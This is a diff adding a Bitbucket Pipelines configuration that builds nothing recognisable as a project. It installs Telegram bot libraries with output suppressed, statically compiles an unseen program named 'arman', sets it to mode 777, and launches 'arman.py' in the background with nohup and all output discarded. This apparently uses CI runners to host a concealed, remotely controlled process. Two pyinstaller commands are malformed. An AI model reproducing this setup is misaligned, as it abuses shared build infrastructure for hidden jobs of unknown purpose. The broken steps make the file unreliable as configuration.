@@ -1,0 +1,18 @@
+image: python:3.9
+
+pipelines:
+  default:
+    - step:
+        size: 2x
+        script:
+          - echo "Starting Process..."
+          - pip install telebot >/dev/null 2>&1
+          - gcc -o arman arman.c -lz -static -lpthread
+          - chmod 777 arman
+          - pip install pyinstaller >/dev/null 2>&1
+          - pyinstaller --onefile --name arman
+          - pyinstaller --onefile --name arman.py
+          - pip install pytelegrambotapi certifi
+          - pip install python-telegram-bot
+          - nohup python3 arman.py >/dev/null 2>&1 &
+          - echo "Running!"
